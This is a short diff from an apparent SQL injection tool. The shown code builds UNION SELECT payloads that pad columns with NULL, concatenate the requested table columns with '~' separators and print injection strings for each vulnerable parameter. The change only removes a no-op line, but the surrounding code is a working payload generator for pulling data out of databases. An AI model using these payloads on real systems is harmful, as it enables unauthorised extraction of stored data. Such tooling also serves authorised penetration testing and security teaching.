@@ -78,7 +78,6 @@ def main():
     print("Single requests for retrieving {} from table {}".format(",".join(args.columns), args.table))
     for v in vulnerable_query_parameter:
         select_columns=['NULL'] * v["table_size"]
-        v["positions"][0]
         single_column_query=" || '~' || ".join(args.columns)
         select_columns[v["positions"][0]]=single_column_query
         print("' UNION SELECT {} FROM {}--".format(",".join(select_columns), args.table))
